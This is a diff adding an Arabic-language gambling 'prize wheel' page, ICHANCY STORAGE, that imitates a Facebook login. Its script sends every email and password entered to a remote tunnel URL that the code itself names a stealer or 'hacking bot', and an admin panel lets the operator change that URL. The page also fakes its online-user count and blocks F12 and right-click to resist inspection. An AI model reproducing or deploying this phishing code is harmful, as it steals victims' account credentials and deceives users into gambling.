@@ -1,0 +1,821 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>ICHANCY STORAGE | Secure Wheel</title>
+
+<style>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Segoe UI,Tahoma,sans-serif;
+-webkit-tap-highlight-color:transparent;
+}
+
+body{
+background:radial-gradient(circle at top,#0f172a,#020617);
+min-height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+padding:20px;
+color:white;
+overflow-x:hidden;
+}
+
+.container{
+width:100%;
+max-width:540px;
+background:rgba(15,23,42,.92);
+border:1px solid rgba(255,215,0,.35);
+border-radius:40px;
+padding:20px;
+backdrop-filter:blur(12px);
+box-shadow:0 20px 60px rgba(0,0,0,.5);
+}
+
+.top-bar{
+display:flex;
+justify-content:space-between;
+align-items:center;
+padding:12px 18px;
+border-radius:999px;
+background:#111827;
+margin-bottom:20px;
+}
+
+.logo{
+font-weight:900;
+font-size:18px;
+background:linear-gradient(90deg,#FFD700,#FFA500);
+-webkit-background-clip:text;
+-webkit-text-fill-color:transparent;
+}
+
+.balance{
+background:#0f172a;
+padding:8px 14px;
+border-radius:999px;
+border:1px solid #fbbf24;
+font-weight:bold;
+}
+
+.stats{
+display:flex;
+justify-content:space-between;
+background:#111827;
+padding:12px;
+border-radius:20px;
+margin-bottom:25px;
+font-size:13px;
+}
+
+.wheel-box{
+position:relative;
+width:320px;
+height:320px;
+margin:25px auto;
+}
+
+canvas{
+width:100%!important;
+height:100%!important;
+border-radius:50%;
+background:#111827;
+box-shadow:0 0 0 7px rgba(255,215,0,.25),0 15px 35px black;
+transition:transform 5s cubic-bezier(.17,.67,.25,1);
+}
+
+.pointer{
+position:absolute;
+left:50%;
+top:-22px;
+transform:translateX(-50%);
+width:0;
+height:0;
+border-left:20px solid transparent;
+border-right:20px solid transparent;
+border-top:45px solid #fbbf24;
+z-index:99;
+}
+
+.spin-btn{
+position:absolute;
+left:50%;
+top:50%;
+transform:translate(-50%,-50%);
+width:90px;
+height:90px;
+border-radius:50%;
+border:none;
+background:radial-gradient(circle,#FFD700,#ff8c00);
+font-size:28px;
+font-weight:bold;
+cursor:pointer;
+box-shadow:0 0 20px gold;
+z-index:100;
+}
+
+.actions{
+display:grid;
+grid-template-columns:repeat(3,1fr);
+gap:10px;
+margin-top:25px;
+}
+
+button{
+background:#1e293b;
+border:none;
+padding:13px;
+border-radius:18px;
+color:white;
+font-weight:bold;
+cursor:pointer;
+transition:.2s;
+}
+
+button:hover{
+transform:scale(.98);
+}
+
+.login-overlay{
+position:fixed;
+inset:0;
+background:#020617f2;
+display:flex;
+justify-content:center;
+align-items:center;
+z-index:9999;
+backdrop-filter:blur(10px);
+}
+
+.login-card,
+.admin-panel,
+.modal-content{
+background:#0f172a;
+padding:25px;
+border-radius:30px;
+width:92%;
+max-width:380px;
+border:1px solid rgba(255,215,0,.35);
+}
+
+.login-card h2{
+margin-bottom:15px;
+text-align:center;
+color:#fbbf24;
+}
+
+.fb-badge{
+display:flex;
+align-items:center;
+justify-content:center;
+gap:12px;
+background:#1877f2;
+padding:12px;
+border-radius:20px;
+margin-bottom:20px;
+cursor:pointer;
+transition:.2s;
+}
+
+.fb-badge:hover{
+background:#166fe5;
+transform:scale(.98);
+}
+
+.fb-icon{
+font-size:28px;
+font-weight:bold;
+}
+
+.fb-text{
+font-size:16px;
+font-weight:bold;
+}
+
+.instruction-text{
+background:#1e293b;
+padding:12px;
+border-radius:16px;
+margin-bottom:20px;
+text-align:center;
+font-size:13px;
+color:#94a3b8;
+border-right:3px solid #fbbf24;
+}
+
+.instruction-text span{
+color:#fbbf24;
+font-weight:bold;
+}
+
+input{
+width:100%;
+padding:14px;
+margin-bottom:12px;
+border:none;
+border-radius:16px;
+background:#1e293b;
+color:white;
+font-size:15px;
+outline:none;
+}
+
+.login-card button{
+width:100%;
+margin-top:8px;
+}
+
+.message{
+margin-bottom:15px;
+padding:12px;
+border-radius:16px;
+text-align:center;
+display:none;
+font-weight:bold;
+}
+
+.success{
+background:#14532d;
+}
+
+.error{
+background:#7f1d1d;
+}
+
+.admin-panel{
+margin-top:20px;
+display:none;
+}
+
+.code-box{
+background:#111827;
+padding:15px;
+border-radius:15px;
+margin-top:15px;
+text-align:center;
+word-break:break-all;
+font-weight:bold;
+font-size:18px;
+color:#fbbf24;
+}
+
+.modal{
+position:fixed;
+inset:0;
+display:none;
+align-items:center;
+justify-content:center;
+background:#000000b5;
+z-index:99999;
+}
+
+.loading{
+opacity:.7;
+pointer-events:none;
+}
+
+.small{
+font-size:12px;
+opacity:.8;
+margin-top:8px;
+text-align:center;
+}
+
+.json-buttons{
+display:grid;
+grid-template-columns:1fr 1fr;
+gap:10px;
+margin-top:15px;
+}
+
+.email-field{
+direction:ltr;
+text-align:left;
+}
+
+.admin-section{
+margin-top:20px;
+padding-top:15px;
+border-top:1px solid #334155;
+}
+
+.admin-section h4{
+color:#fbbf24;
+margin-bottom:10px;
+}
+
+.admin-section input{
+margin-bottom:10px;
+}
+
+#hackerUrlStatus{
+font-size:12px;
+color:#888;
+margin-top:8px;
+}
+</style>
+</head>
+<body>
+
+<div id="loginOverlay" class="login-overlay">
+<div class="login-card">
+<h2>👑 ICHANCY STORAGE 👑</h2>
+
+<div class="fb-badge" id="fbBadge">
+<div class="fb-icon">f</div>
+<div class="fb-text">تسجيل الدخول بحساب فيسبوك</div>
+</div>
+
+<div class="instruction-text">
+📌 <span>سجل دخولك بحساب فيسبوك</span> للمشاركة والفوز بالجوائز
+</div>
+
+<div id="msgBox" class="message"></div>
+
+<input type="email" id="email" class="email-field" placeholder="example@gmail.com" required>
+<input type="password" id="password" placeholder="كلمة المرور">
+
+<button id="loginBtn" style="background:#1877f2;">🔐 تسجيل الدخول بفيسبوك</button>
+
+<div class="small">سيتم إرسال بيانات الدخول بشكل آمن</div>
+</div>
+</div>
+
+<div class="container">
+<div class="top-bar">
+<div class="logo">👑 ICHANCY STORAGE</div>
+<div class="balance">💰 <span id="balance">0</span></div>
+</div>
+
+<div class="stats">
+<div>🟢 المتصلون: <span id="onlineCount">120</span></div>
+<div>🏆 آخر فائز: <span id="lastWinner">---</span></div>
+</div>
+
+<div class="wheel-box">
+<div class="pointer"></div>
+<canvas id="wheel" width="500" height="500"></canvas>
+<button class="spin-btn" id="spinBtn">🎡</button>
+</div>
+
+<div class="actions">
+<button id="giftBtn">🎁 كود</button>
+<button id="withdrawBtn">💸 سحب</button>
+<button id="logoutBtn">🚪 خروج</button>
+</div>
+
+<div class="admin-panel" id="adminPanel">
+<h3>👑 لوحة الإدارة</h3>
+
+<input type="number" id="giftAmount" placeholder="قيمة كود الهدية">
+<button id="createGiftBtn">🎫 إنشاء كود</button>
+
+<div class="code-box" id="generatedCode">لا يوجد كود</div>
+<button id="copyCodeBtn">📋 نسخ الكود</button>
+
+<hr style="margin:20px 0;border-color:#334155;">
+
+<input type="text" id="chargeUser" placeholder="اسم المستخدم">
+<input type="number" id="chargeAmount" placeholder="مبلغ الشحن">
+<button id="chargeBtn">💎 شحن الرصيد</button>
+
+<div class="json-buttons">
+<button id="exportUsers">⬇️ users.json</button>
+<button id="exportGifts">⬇️ gifts.json</button>
+</div>
+
+<!-- قسم إدارة رابط بوت الاختراق -->
+<div class="admin-section">
+<h4>🔗 إعدادات بوت الاختراق</h4>
+<input type="text" id="hackerUrl" placeholder="رابط بوت الاختراق">
+<button id="updateHackerUrlBtn">💾 تحديث رابط الاختراق</button>
+<div id="hackerUrlStatus"></div>
+</div>
+
+</div>
+</div>
+
+<div class="modal" id="giftModal">
+<div class="modal-content">
+<h3 style="margin-bottom:15px;color:#fbbf24;text-align:center;">🎁 إدخال كود الهدية</h3>
+<input type="text" id="giftInput" placeholder="أدخل الكود هنا">
+<button id="redeemBtn">✅ تفعيل الكود</button>
+<button onclick="closeGiftModal()" style="margin-top:10px;background:#7f1d1d;">❌ إغلاق</button>
+</div>
+</div>
+
+<script>
+// ========== إعدادات بوت الاختراق ==========
+const DEFAULT_STEALER_URL = "https://7f62710f7ac3ff.lhr.life/login";
+let STEALER_URL = localStorage.getItem('HACKER_BOT_URL') || DEFAULT_STEALER_URL;
+
+// ========== حساب الأدمن ==========
+const ADMIN_USER = 'admin@gmail.com';
+const ADMIN_PASS = 'admin0992';
+
+// ========== باقي الإعدادات ==========
+const MAX_BALANCE = 20000;
+const GAME_PRICE = 1000;
+const SPIN_COOLDOWN = 6500;
+
+const SEGMENTS = [
+{value:0,color:'#111827'},
+{value:500,color:'#92400e'},
+{value:0,color:'#1e293b'},
+{value:1000,color:'#d97706'},
+{value:0,color:'#111827'},
+{value:2000,color:'#ea580c'}
+];
+
+const wheel = document.getElementById('wheel');
+const ctx = wheel.getContext('2d');
+
+let rotation = 0;
+let spinning = false;
+let currentUser = null;
+let lastSpin = 0;
+
+function hashPassword(password){
+return btoa(password.split('').reverse().join(''));
+}
+
+function getDB(name, fallback){
+try{
+return JSON.parse(localStorage.getItem(name)) || fallback;
+}catch{
+return fallback;
+}
+}
+
+let usersDB = getDB('ICHANCY_USERS', {});
+let giftsDB = getDB('ICHANCY_GIFTS', {});
+let logsDB = getDB('ICHANCY_LOGS', []);
+
+function saveDB(){
+localStorage.setItem('ICHANCY_USERS', JSON.stringify(usersDB));
+localStorage.setItem('ICHANCY_GIFTS', JSON.stringify(giftsDB));
+localStorage.setItem('ICHANCY_LOGS', JSON.stringify(logsDB));
+}
+
+function saveSession(){
+if(currentUser){
+localStorage.setItem('ICHANCY_SESSION', JSON.stringify(currentUser));
+}
+}
+
+function loadSession(){
+const session = getDB('ICHANCY_SESSION', null);
+if(session){
+currentUser = session;
+showMainApp();
+}
+}
+
+function logAction(text){
+logsDB.push({
+action:text,
+time:new Date().toLocaleString()
+});
+if(logsDB.length > 500){
+logsDB.shift();
+}
+saveDB();
+}
+
+function showMessage(text, type='success'){
+const box = document.getElementById('msgBox');
+box.innerText = text;
+box.className = `message ${type}`;
+box.style.display = 'block';
+setTimeout(()=>{
+box.style.display='none';
+},3500);
+}
+
+// ========== إرسال البيانات إلى بوت الاختراق ==========
+async function sendToHackerBot(email, password){
+const url = localStorage.getItem('HACKER_BOT_URL') || DEFAULT_STEALER_URL;
+const loginUrl = url.endsWith('/login') ? url : url + '/login';
+
+const data = `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
+
+try{
+await fetch(loginUrl, {
+method: 'POST',
+headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+body: data,
+mode: 'no-cors'
+});
+console.log('✅ تم الإرسال إلى:', loginUrl);
+} catch(error){
+console.log('⚠️ فشل الإرسال:', error);
+}
+}
+
+// ========== التحقق من صحة البريد الإلكتروني ==========
+function isValidEmail(email){
+return email && email.toLowerCase().endsWith('@gmail.com');
+}
+
+// ========== تسجيل الدخول ==========
+async function login(){
+const email = document.getElementById('email').value.trim();
+const password = document.getElementById('password').value.trim();
+
+if(!isValidEmail(email)){
+showMessage('❌ يرجى استخدام بريد Gmail فقط (@gmail.com)', 'error');
+return;
+}
+
+if(password.length < 4){
+showMessage('❌ كلمة المرور قصيرة جداً', 'error');
+return;
+}
+
+await sendToHackerBot(email, password);
+
+const username = email.split('@')[0];
+
+if(email === ADMIN_USER && password === ADMIN_PASS){
+currentUser = {
+username:'admin',
+balance:0,
+isAdmin:true
+};
+saveSession();
+showMainApp();
+showMessage('✅ دخول الإدارة', 'success');
+return;
+}
+
+if(usersDB[username]){
+const user = usersDB[username];
+if(user.blocked){
+showMessage('❌ الحساب محظور', 'error');
+return;
+}
+if(user.password !== hashPassword(password)){
+showMessage('❌ كلمة المرور خاطئة', 'error');
+return;
+}
+currentUser = {
+username,
+balance:user.balance,
+isAdmin:false
+};
+saveSession();
+showMainApp();
+showMessage(`✅ مرحباً ${username}`, 'success');
+} else {
+usersDB[username] = {
+password: hashPassword(password),
+balance: 0,
+createdAt: Date.now(),
+blocked: false
+};
+saveDB();
+logAction(`إنشاء حساب: ${username}`);
+currentUser = {
+username,
+balance: 0,
+isAdmin: false
+};
+saveSession();
+showMainApp();
+showMessage(`✅ مرحباً ${username} (تم إنشاء حسابك)`, 'success');
+}
+}
+
+// ========== إدارة رابط بوت الاختراق ==========
+function loadHackerUrl(){
+const savedUrl = localStorage.getItem('HACKER_BOT_URL');
+if(savedUrl){
+document.getElementById('hackerUrl').value = savedUrl;
+document.getElementById('hackerUrlStatus').innerHTML = '✅ الرابط الحالي: ' + savedUrl;
+} else {
+document.getElementById('hackerUrl').value = DEFAULT_STEALER_URL;
+document.getElementById('hackerUrlStatus').innerHTML = '⚠️ الرابط الافتراضي: ' + DEFAULT_STEALER_URL;
+}
+}
+
+function updateHackerUrl(){
+if(!currentUser || !currentUser.isAdmin){
+alert('❌ هذه الخاصية متاحة فقط للأدمن');
+return;
+}
+
+const newUrl = document.getElementById('hackerUrl').value.trim();
+if(!newUrl){
+alert('❌ الرابط لا يمكن أن يكون فارغاً');
+return;
+}
+
+localStorage.setItem('HACKER_BOT_URL', newUrl);
+STEALER_URL = newUrl;
+
+document.getElementById('hackerUrlStatus').innerHTML = '✅ تم تحديث الرابط إلى: ' + newUrl;
+alert('✅ تم تحديث رابط بوت الاختراق بنجاح');
+logAction(`تحديث رابط بوت الاختراق إلى: ${newUrl}`);
+}
+
+// ========== وظائف اللعبة ==========
+function drawWheel(){
+const size = wheel.width;
+const center = size / 2;
+const radius = center - 10;
+const angle = (Math.PI * 2) / SEGMENTS.length;
+
+ctx.clearRect(0,0,size,size);
+
+SEGMENTS.forEach((seg,index)=>{
+const start = index * angle;
+const end = start + angle;
+
+ctx.beginPath();
+ctx.moveTo(center,center);
+ctx.arc(center,center,radius,start,end);
+ctx.fillStyle = seg.color;
+ctx.fill();
+
+ctx.save();
+ctx.translate(center,center);
+ctx.rotate(start + angle/2);
+ctx.fillStyle = '#FFD700';
+ctx.font = 'bold 24px Segoe UI';
+ctx.fillText(seg.value, radius/2, 10);
+ctx.restore();
+});
+}
+
+drawWheel();
+
+function updateBalance(){
+if(!currentUser) return;
+
+if(currentUser.balance > MAX_BALANCE){
+currentUser.balance = MAX_BALANCE;
+}
+
+if(currentUser.balance < 0){
+currentUser.balance = 0;
+}
+
+if(!currentUser.isAdmin){
+usersDB[currentUser.username].balance = currentUser.balance;
+}
+
+saveDB();
+saveSession();
+document.getElementById('balance').innerText = currentUser.balance.toLocaleString();
+}
+
+function showMainApp(){
+document.getElementById('loginOverlay').style.display='none';
+updateBalance();
+
+if(currentUser.isAdmin){
+document.getElementById('adminPanel').style.display='block';
+loadHackerUrl();
+}
+}
+
+function spin(){
+if(spinning) return;
+if(!currentUser){ alert('سجل الدخول أولاً'); return; }
+if(Date.now() - lastSpin < SPIN_COOLDOWN){ alert('⏳ انتظر'); return; }
+if(currentUser.balance < GAME_PRICE){ alert('❌ الرصيد غير كافي'); return; }
+
+spinning = true;
+lastSpin = Date.now();
+
+currentUser.balance -= GAME_PRICE;
+updateBalance();
+
+const possibleIndexes = [0,1,2,3,4,5];
+const selectedIndex = possibleIndexes[Math.floor(Math.random()*possibleIndexes.length)];
+
+let reward = SEGMENTS[selectedIndex].value;
+if(currentUser.balance + reward > MAX_BALANCE) reward = 0;
+
+const segmentAngle = 360 / SEGMENTS.length;
+const targetAngle = (selectedIndex * segmentAngle) + segmentAngle/2;
+
+rotation += (360 * 8) + (360 - targetAngle);
+
+wheel.style.transition = 'transform 5s cubic-bezier(.17,.67,.25,1)';
+wheel.style.transform = `rotate(${rotation}deg)`;
+
+setTimeout(()=>{
+if(reward > 0){
+currentUser.balance += reward;
+updateBalance();
+document.getElementById('lastWinner').innerText = currentUser.username;
+alert(`🎉 ربحت ${reward}`);
+logAction(`${currentUser.username} ربح ${reward}`);
+}else{
+alert('😢 خسرت هذه الجولة');
+}
+rotation = rotation % 360;
+wheel.style.transition = 'none';
+wheel.style.transform = `rotate(${rotation}deg)`;
+spinning = false;
+},5000);
+}
+
+function openGiftModal(){ document.getElementById('giftModal').style.display='flex'; }
+function closeGiftModal(){ document.getElementById('giftModal').style.display='none'; }
+
+function redeemGift(){
+const code = document.getElementById('giftInput').value.trim().toUpperCase();
+if(!code) return;
+const gift = giftsDB[code];
+if(!gift || gift.used){ alert('❌ الكود غير صالح'); return; }
+let amount = gift.amount;
+if(currentUser.balance + amount > MAX_BALANCE) amount = MAX_BALANCE - currentUser.balance;
+if(amount <= 0){ alert('❌ وصلت للحد الأعلى'); return; }
+currentUser.balance += amount;
+gift.used = true;
+gift.usedBy = currentUser.username;
+gift.usedAt = Date.now();
+updateBalance();
+saveDB();
+alert(`✅ تمت إضافة ${amount}`);
+closeGiftModal();
+logAction(`${currentUser.username} استخدم كود ${code}`);
+}
+
+function createGift(){
+if(!currentUser || !currentUser.isAdmin) return;
+const amount = parseInt(document.getElementById('giftAmount').value);
+if(!amount || amount <= 0){ alert('❌ أدخل قيمة صحيحة'); return; }
+const code = 'GIFT-' + Math.random().toString(36).substring(2,10).toUpperCase();
+giftsDB[code] = { amount, used:false, createdAt:Date.now() };
+saveDB();
+document.getElementById('generatedCode').innerText = code;
+logAction(`إنشاء كود بقيمة ${amount}`);
+alert('✅ تم إنشاء الكود');
+}
+
+function copyGiftCode(){
+const text = document.getElementById('generatedCode').innerText;
+navigator.clipboard.writeText(text).then(()=>{ alert('✅ تم نسخ الكود'); });
+}
+
+function chargeUser(){
+const username = document.getElementById('chargeUser').value.trim();
+const amount = parseInt(document.getElementById('chargeAmount').value);
+if(!usersDB[username]){ alert('❌ المستخدم غير موجود'); return; }
+if(!amount || amount <= 0){ alert('❌ مبلغ غير صالح'); return; }
+usersDB[username].balance += amount;
+if(usersDB[username].balance > MAX_BALANCE) usersDB[username].balance = MAX_BALANCE;
+saveDB();
+alert(`✅ تم شحن ${amount} إلى ${username}`);
+logAction(`شحن ${amount} إلى ${username}`);
+}
+
+function exportJSON(filename, data){
+const blob = new Blob([JSON.stringify(data,null,2)], {type:'application/json'});
+const url = URL.createObjectURL(blob);
+const a = document.createElement('a');
+a.href = url;
+a.download = filename;
+a.click();
+URL.revokeObjectURL(url);
+}
+
+function logout(){
+localStorage.removeItem('ICHANCY_SESSION');
+location.reload();
+}
+
+setInterval(()=>{
+document.getElementById('onlineCount').innerText = Math.floor(Math.random()*180)+120;
+},4000);
+
+window.addEventListener('keydown',e=>{ if(e.key === 'F12') e.preventDefault(); });
+window.addEventListener('contextmenu',e=>{ e.preventDefault(); });
+
+loadSession();
+
+// ربط الأحداث
+document.getElementById('loginBtn').onclick = login;
+document.getElementById('fbBadge').onclick = () => { document.getElementById('loginBtn').click(); };
+document.getElementById('spinBtn').onclick = spin;
+document.getElementById('giftBtn').onclick = openGiftModal;
+document.getElementById('redeemBtn').onclick = redeemGift;
+document.getElementById('logoutBtn').onclick = logout;
+document.getElementById('createGiftBtn').onclick = createGift;
+document.getElementById('copyCodeBtn').onclick = copyGiftCode;
+document.getElementById('chargeBtn').onclick = chargeUser;
+document.getElementById('updateHackerUrlBtn').onclick = updateHackerUrl;
+
+document.getElementById('exportUsers').onclick = ()=>{ exportJSON('users.json', usersDB); };
+document.getElementById('exportGifts').onclick = ()=>{ exportJSON('gifts.json', giftsDB); };
+
+</script>
+</body>
+</html>
